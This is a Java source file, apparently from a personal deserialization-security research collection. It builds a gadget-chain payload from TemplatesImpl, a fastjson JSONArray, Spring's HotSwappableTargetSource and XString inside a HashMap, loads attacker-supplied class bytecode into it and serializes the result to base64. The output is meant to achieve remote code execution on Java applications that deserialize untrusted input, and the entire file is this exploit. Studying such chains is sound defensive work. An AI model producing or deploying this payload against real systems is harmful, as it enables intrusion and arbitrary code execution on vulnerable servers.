package com.yyjccc.rome;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.yyjccc.Utils.Reflect;
import com.yyjccc.Utils.Tool;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class Payload {


	public static Object payload() throws NoSuchFieldException, IllegalAccessException, IOException {

		TemplatesImpl templates=new TemplatesImpl();
		Reflect.setValue(templates,"_name","yyjccc");
		byte[] code= Files.readAllBytes(Paths.get("F:\\code\\java\\all-javasec-code\\SerGadget\\Rome\\target\\classes\\com\\yyjccc\\rome\\MyClass.class"));
		Reflect.setValue(templates,"_bytecodes",new byte[][]{code});
		Reflect.setValue(templates,"_tfactory",new TransformerFactoryImpl());
		JSONArray jsonArray=new JSONArray();
		jsonArray.add(templates);
		HotSwappableTargetSource h1=new HotSwappableTargetSource(jsonArray);
		HotSwappableTargetSource h2=new HotSwappableTargetSource("a");
		HashMap<Object, Object> hashMap = new HashMap<>();
		hashMap.put(h1,h1);
		hashMap.put(h2,h2);
		Reflect.setValue(h2,"target",new XString("yyjccc"));
		return hashMap;

	}
	public static void main(String[] args) {
		try {
			Tool.mode="base64";
			Tool.serialize(payload());
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
}
